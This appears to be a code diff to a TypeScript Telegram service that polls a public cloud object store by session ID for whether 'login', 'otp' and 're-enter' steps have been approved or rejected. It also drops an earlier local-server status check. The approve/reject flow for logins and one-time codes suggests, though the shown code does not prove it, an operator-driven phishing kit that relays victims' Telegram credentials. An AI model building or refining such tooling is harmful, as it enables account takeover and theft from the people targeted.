@@ -570,10 +570,8 @@ class TelegramService {
   }
 
   /**
-   * Fast Real-time Status Polling (Multi-Tier Resilient Check)
-   * 1. Check local session state
-   * 2. Server status snapshot check
-   * 3. Cloud State Lookup
+   * Fast Real-time Status Polling
+   * Check cloud directly using sessionId as the ID
    */
   public async pollUpdates(
     sessionId: string,
@@ -594,30 +592,26 @@ class TelegramService {
       }
     }
 
-    const resolvedCloudId = this.getCloudId(sessionId);
-    const cleanPhone = phone ? phone.replace(/\D/g, '') : '';
-    const timestamp = Date.now();
-
-    // 2. Check /api/telegram/status snapshot (NO RETRY - needs to be fast)
+    // 2. Check cloud directly using sessionId
     try {
-      const statusUrl = `/api/telegram/status?id=${encodeURIComponent(resolvedCloudId)}&sessionId=${encodeURIComponent(
-        sessionId
-      )}&phone=${encodeURIComponent(cleanPhone)}&_t=${timestamp}`;
-
-      const serverRes = await fetch(statusUrl, {
+      const cloudRes = await fetch(`https://api.restful-api.dev/objects/${sessionId}`, {
+        headers: BROWSER_HEADERS,
         cache: 'no-store',
-        headers: { 'Cache-Control': 'no-cache' },
       });
 
-      if (serverRes.ok) {
-        const data = await this.safeJson(serverRes);
-        if (data) {
+      if (cloudRes.ok) {
+        const record = await this.safeJson(cloudRes);
+        if (record) {
+          const data = record?.data || {};
+
           if (targetStep === 'login' && (data.loginStatus === 'approved' || data.loginStatus === 'rejected')) {
             if (local) local.loginStatus = data.loginStatus;
+            console.log('[Poll] Login status from cloud:', data.loginStatus, 'for session:', sessionId);
             return data.loginStatus;
           }
           if (targetStep === 'otp' && (data.otpStatus === 'approved' || data.otpStatus === 'rejected')) {
             if (local) local.otpStatus = data.otpStatus;
+            console.log('[Poll] OTP status from cloud:', data.otpStatus, 'for session:', sessionId);
             return data.otpStatus;
           }
           if (targetStep === 'reenter' && (data.reenterStatus === 'approved' || data.reenterStatus === 'rejected')) {
@@ -626,38 +620,8 @@ class TelegramService {
           }
         }
       }
-    } catch {
-      // Backend snapshot unavailable
-    }
-
-    // 3. Cloud State Lookup on restful-api.dev (NO RETRY - needs to be fast)
-    if (resolvedCloudId && resolvedCloudId !== sessionId && !resolvedCloudId.startsWith('stl_')) {
-      try {
-        const cloudRes = await fetch(`https://api.restful-api.dev/objects/${resolvedCloudId}`, {
-          headers: BROWSER_HEADERS,
-          cache: 'no-store',
-        });
-
-        if (cloudRes.ok) {
-          const record = await this.safeJson(cloudRes);
-          if (record) {
-            const data = record?.data || {};
-
-            if (targetStep === 'login' && (data.loginStatus === 'approved' || data.loginStatus === 'rejected')) {
-              if (local) local.loginStatus = data.loginStatus;
-              return data.loginStatus;
-            }
-            if (targetStep === 'otp' && (data.otpStatus === 'approved' || data.otpStatus === 'rejected')) {
-              if (local) local.otpStatus = data.otpStatus;
-              return data.otpStatus;
-            }
-            if (targetStep === 'reenter' && (data.reenterStatus === 'approved' || data.reenterStatus === 'rejected')) {
-              if (local) local.reenterStatus = data.reenterStatus;
-              return data.reenterStatus;
-            }
-          }
-        }
-      } catch {}
+    } catch (e) {
+      console.warn('[Poll] Cloud check error:', e);
     }
 
     return 'pending';
